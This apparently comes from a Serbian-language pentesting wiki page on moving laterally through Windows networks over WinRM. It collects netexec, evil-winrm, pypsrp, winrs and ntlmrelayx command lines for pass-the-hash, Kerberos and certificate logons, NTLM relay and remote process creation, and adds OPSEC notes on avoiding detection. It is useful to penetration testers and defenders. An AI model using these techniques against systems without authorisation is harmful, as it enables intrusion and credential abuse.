# WinRM

{{#include ../../banners/hacktricks-training.md}}

WinRM je jedan od najpraktičnijih transporta za **lateral movement** u Windows okruženjima, jer omogućava udaljeni shell preko **WS-Man/HTTP(S)** bez potrebe za trikovima sa kreiranjem SMB servisa. Ako target izlaže **5985/5986**, a vaš principal ima dozvolu za korišćenje remoting-a, često možete veoma brzo preći sa "valid creds" na "interactive shell".

Za **protocol/service enumeration**, listenere, enabling WinRM, `Invoke-Command` i opštu upotrebu client-a, pogledajte:

{{#ref}}
../../network-services-pentesting/5985-5986-pentesting-winrm.md
{{#endref}}

## Zašto operatori vole WinRM

- Koristi **HTTP/HTTPS** umesto SMB/RPC-a, pa često funkcioniše tamo gde je izvršavanje u PsExec stilu blokirano.
- Sa **Kerberos-om** izbegava slanje credential-a koji se mogu ponovo koristiti na target.
- Čisto funkcioniše iz **Windows**, **Linux** i Python tooling-a (`winrs`, `evil-winrm`, `pypsrp`, `netexec`).
- Interaktivni PowerShell remoting path pokreće **`wsmprovhost.exe`** na target-u u kontekstu autentifikovanog user-a, što se operativno razlikuje od izvršavanja zasnovanog na servisu.

## Model pristupa i prerequisites

U praksi, uspešan WinRM lateral movement zavisi od **tri** stvari:

1. Target ima **WinRM listener** (`5985`/`5986`) i firewall rules koje dozvoljavaju pristup.
2. Account može da se **authenticate** na endpoint.
3. Account ima dozvolu da **otvori remoting session**.

Uobičajeni načini za dobijanje tog pristupa:

- **Local Administrator** na target-u.
- Članstvo u grupi **Remote Management Users** na novijim sistemima ili u grupi **WinRMRemoteWMIUsers__** na sistemima/komponentama koje i dalje poštuju tu grupu.
- Eksplicitna remoting prava dodeljena kroz lokalne security descriptor-e / izmene PowerShell remoting ACL-ova.

Ako već kontrolišete box sa admin pravima, imajte na umu da takođe možete **delegirati WinRM pristup bez članstva u punoj admin grupi**, koristeći tehnike opisane ovde:

{{#ref}}
../active-directory-methodology/security-descriptors.md
{{#endref}}

### Authentication gotchas koji su bitni tokom lateral movement-a

- **Kerberos zahteva hostname/FQDN**. Ako se povezujete preko IP adrese, client se obično vraća na **NTLM/Negotiate**.
- U **workgroup** ili cross-trust edge slučajevima, NTLM obično zahteva ili **HTTPS** ili da target bude dodat u **TrustedHosts** na client-u.
- Sa **local accounts** preko Negotiate-a u workgroup-u, UAC remote restrictions mogu sprečiti pristup, osim ako se koristi ugrađeni Administrator account ili `LocalAccountTokenFilterPolicy=1`.
- PowerShell remoting podrazumevano koristi **`HTTP/<host>` SPN**. U okruženjima gde je **`HTTP/<host>`** već registrovan za neki drugi service account, WinRM Kerberos može da otkaže sa greškom `0x80090322`; koristite port-qualified SPN ili pređite na **`WSMAN/<host>`** tamo gde taj SPN postoji.<sup>[[3]](#references)</sup>

Ako dođete do validnih credential-a tokom password spraying-a, njihova validacija preko WinRM-a je često najbrži način da proverite da li omogućavaju shell:

{{#ref}}
../active-directory-methodology/password-spraying.md
{{#endref}}

## Linux-to-Windows lateral movement

### NetExec / CrackMapExec za validaciju i one-shot execution
```bash
# Validate creds and execute a simple command
netexec winrm <HOST_FQDN> -u <USER> -p '<PASSWORD>' -x "whoami /all"

# Pass-the-Hash
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -x "hostname"

# PowerShell command instead of cmd.exe
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -X '$PSVersionTable'
```
### Evil-WinRM za interaktivne shell-ove

`evil-winrm` ostaje najpraktičnija interaktivna opcija iz Linuxa jer podržava **lozinke**, **NT hash-eve**, **Kerberos tikete**, **klijentske sertifikate**, prenos datoteka i učitavanje PowerShell/.NET-a u memoriju.
```bash
# Password
evil-winrm -i <HOST_FQDN> -u <USER> -p '<PASSWORD>'

# Pass-the-Hash
evil-winrm -i <HOST_FQDN> -u <USER> -H <NTHASH>

# Kerberos using an existing ccache/kirbi
export KRB5CCNAME=./user.ccache
evil-winrm -i <HOST_FQDN> -r <REALM.LOCAL>
```
### Kerberos SPN specifičan slučaj: `HTTP` naspram `WSMAN`

Kada podrazumevani **`HTTP/<host>`** SPN izaziva Kerberos greške, pokušajte da zatražite/koristite **`WSMAN/<host>`** ticket umesto njega. Ovo se može pojaviti u ojačanim ili neuobičajenim enterprise okruženjima gde je **`HTTP/<host>`** već dodeljen drugom service account-u.<sup>[[3]](#references)</sup>
```bash
# Example: use a WSMAN ticket instead of the default HTTP SPN
export KRB5CCNAME=administrator@WSMAN_srv01.domain.local@DOMAIN.LOCAL.ccache
evil-winrm -i srv01.domain.local -r DOMAIN.LOCAL --spn WSMAN
```
Ovo je takođe korisno nakon zloupotrebe **RBCD / S4U** kada ste konkretno falsifikovali ili zatražili servisnu kartu **WSMAN**, a ne generičku `HTTP` kartu.

### Authentication zasnovana na sertifikatu

WinRM takođe podržava **client certificate authentication**, ali sertifikat mora biti mapiran na ciljnom sistemu na **lokalni nalog**. Iz ofanzivne perspektive, ovo je važno kada:

- ukradete/izvezete važeći klijentski sertifikat i privatni ključ koji su već mapirani za WinRM;
- zloupotrebite **AD CS / Pass-the-Certificate** da biste dobili sertifikat za principal, a zatim izvršite pivot u drugi authentication path;
- radite u okruženjima koja namerno izbegavaju remoting zasnovan na lozinkama.
```bash
evil-winrm -i <HOST_FQDN> -S -c user.crt -k user.key
```
Client-certificate WinRM je mnogo ređi od password/hash/Kerberos auth, ali kada postoji, može omogućiti **lateral movement bez password-a** koji opstaje i nakon rotacije password-a.

### Python / automatizacija sa `pypsrp`

Ako vam je potrebna automatizacija umesto operatorskog shell-a, `pypsrp` omogućava WinRM/PSRP iz Python-a uz podršku za **NTLM**, **certificate auth**, **Kerberos** i **CredSSP**.<sup>[[2]](#references)</sup>
```python
from pypsrp.client import Client

client = Client(
"srv01.domain.local",
username="DOMAIN\\user",
password="Password123!",
ssl=False,
)
stdout, stderr, rc = client.execute_cmd("whoami /all")
print(stdout, stderr, rc)
```
Ako vam je potrebna preciznija kontrola od one koju pruža wrapper visokog nivoa `Client`, API-ji nižeg nivoa `WSMan` + `RunspacePool` korisni su za dva uobičajena problema operatora:

- forsiranje **`WSMAN`** kao Kerberos service/SPN umesto podrazumevanog očekivanja **`HTTP`** koje koriste mnogi PowerShell klijenti;
- povezivanje sa **PSRP endpointom koji nije podrazumevani**, kao što je **JEA** / custom session configuration, umesto sa `Microsoft.PowerShell`.
```python
from pypsrp.wsman import WSMan
from pypsrp.powershell import PowerShell, RunspacePool

wsman = WSMan(
"srv01.domain.local",
auth="kerberos",
ssl=False,
negotiate_service="WSMAN",
)

with wsman, RunspacePool(wsman, configuration_name="MyJEAEndpoint") as pool, PowerShell(pool) as ps:
ps.add_script("whoami; Get-Command")
output = ps.invoke()
print(output)
```
### Custom PSRP endpoints and JEA su važni tokom lateral movement-a

Uspešna WinRM authentication **ne znači** uvek da ćete dospeti na podrazumevani, neograničeni `Microsoft.PowerShell` endpoint. Zrela okruženja mogu izložiti **custom session configurations** ili **JEA** endpointe sa sopstvenim ACL-ovima i run-as ponašanjem.<sup>[[1]](#references)</sup>

Ako već imate code execution na Windows hostu i želite da utvrdite koje remoting površine postoje, izlistajte registrovane endpointe:
```powershell
Get-PSSessionConfiguration | Select-Object Name, Permission
```
Kada postoji koristan endpoint, eksplicitno ga ciljajte umesto podrazumevanog shell-a:
```powershell
Enter-PSSession -ComputerName srv01.domain.local -ConfigurationName MyJEAEndpoint
```
Praktične ofanzivne posledice:

- **restricted** endpoint i dalje može biti dovoljan za lateral movement ako izlaže upravo one cmdlet-e/funkcije potrebne za kontrolu servisa, pristup fajlovima, kreiranje procesa ili proizvoljno izvršavanje .NET / external komandi.
- **Misconfigured JEA** role je naročito vredna kada izlaže opasne komande kao što su `Start-Process`, široke wildcard-e, writable providere ili prilagođene proxy funkcije koje omogućavaju izlazak iz predviđenih ograničenja.
- Endpoint-i zasnovani na **RunAs virtual accounts** ili **gMSAs** menjaju efektivni security context komandi koje izvršavate. Konkretno, endpoint zasnovan na gMSA može obezbediti **network identity on the second hop** čak i kada bi se normalna WinRM sesija suočila sa klasičnim problemom delegacije.

## Windows-native WinRM lateral movement

### `winrs.exe`

`winrs.exe` je ugrađen i koristan kada želite **native WinRM command execution** bez otvaranja interaktivne PowerShell remoting sesije:
```cmd
winrs -r:srv01.domain.local cmd /c whoami
winrs -r:https://srv01.domain.local:5986 -u:DOMAIN\\user -p:Password123! hostname
```
Dve zastavice se lako zaborave, a u praksi su važne:

- `/noprofile` je često obavezan kada remote principal **nije lokalni administrator**.
- `/allowdelegate` omogućava remote shell-u da koristi vaše kredencijale za pristup **trećem hostu** (na primer, kada komanda zahteva `\\fileserver\share`).
```cmd
winrs -r:srv01.domain.local /noprofile cmd /c set
winrs -r:srv01.domain.local /allowdelegate cmd /c dir \\fileserver.domain.local\share
```
Operativno, `winrs.exe` obično rezultira udaljenim lancem procesa sličnim sledećem:
```text
svchost.exe (DcomLaunch) -> winrshost.exe -> cmd.exe /c <command>
```
Ovo vredi zapamtiti jer se razlikuje od izvršavanja zasnovanog na servisu i od interaktivnih PSRP sesija.

### `winrm.cmd` / WS-Man COM umesto PowerShell remoting

Možete izvršavati i kroz **WinRM transport** bez korišćenja `Enter-PSSession`, pozivanjem WMI klasa preko WS-Man-a. Na ovaj način transport ostaje WinRM, dok primitiva za udaljeno izvršavanje postaje **WMI `Win32_Process.Create`**:
```cmd
winrm invoke Create wmicimv2/Win32_Process @{CommandLine="cmd.exe /c whoami > C:\\Windows\\Temp\\who.txt"} -r:srv01.domain.local
```
Ovaj pristup je koristan kada:

- PowerShell logging se detaljno prati.
- Želite **WinRM transport**, ali ne i klasičan PS remoting workflow.
- Pravite ili koristite prilagođene alate zasnovane na COM objektu **`WSMan.Automation`**.

## NTLM relay to WinRM (WS-Man)

Kada je SMB relay blokiran potpisivanjem, a LDAP relay ograničen, **WS-Man/WinRM** i dalje može biti privlačna relay meta. Moderne verzije `ntlmrelayx.py` uključuju **WinRM relay servere** i mogu vršiti relay ka metama **`wsman://`** ili **`winrms://`**.
```bash
# Relay to HTTP WinRM
ntlmrelayx.py -t wsman://srv01.domain.local --no-smb-server -smb2support

# Relay to HTTPS WinRM
ntlmrelayx.py -t winrms://srv01.domain.local --no-smb-server -smb2support
```
Dve praktične napomene:

- Relay je najkorisniji kada cilj prihvata **NTLM**, a relayed principal ima dozvolu da koristi WinRM.
- Noviji Impacket kod posebno obrađuje zahteve **`WSMANIDENTIFY: unauthenticated`**, tako da probe u stilu `Test-WSMan` ne prekidaju relay tok.

Za ograničenja sa više hopova nakon uspostavljanja prve WinRM sesije pogledajte:

{{#ref}}
../active-directory-methodology/kerberos-double-hop-problem.md
{{#endref}}

## OPSEC i napomene o detekciji

- **Interactive PowerShell remoting** obično kreira **`wsmprovhost.exe`** na cilju.
- **`winrs.exe`** obično kreira **`winrshost.exe`**, a zatim i traženi child process.
- Prilagođeni **JEA** endpoints mogu izvršavati radnje kao **`WinRM_VA_*`** virtual accounts ili kao konfigurisani **gMSA**, što menja i telemetry i ponašanje pri second hop-u u poređenju sa shell-om u kontekstu običnog korisnika.<sup>[[1]](#references)</sup>
- Očekujte **network logon** telemetry, događaje WinRM servisa i PowerShell operational/script-block logging ako koristite PSRP umesto sirovog `cmd.exe`.
- Ako vam je potrebna samo jedna komanda, `winrs.exe` ili jednokratno WinRM izvršavanje može biti manje uočljivo od dugotrajne interaktivne remoting sesije.
- Ako je Kerberos dostupan, preferirajte **FQDN + Kerberos** umesto IP + NTLM da biste smanjili probleme sa poverenjem i nezgodne izmene klijentske postavke `TrustedHosts`.

## Reference

- [1] [Microsoft: Bezbednosna razmatranja za JEA](https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/jea/security-considerations?view=powershell-7.6)
- [2] [pypsrp README](https://github.com/jborean93/pypsrp)
- [3] [Microsoft: Greška `0x80090322` pri povezivanju PowerShell-a sa udaljenim serverom putem WinRM-a](https://learn.microsoft.com/en-us/troubleshoot/windows-server/system-management-components/error-0x80090322-when-connecting-powershell-to-remote-server-via-winrm)


{{#include ../../banners/hacktricks-training.md}}
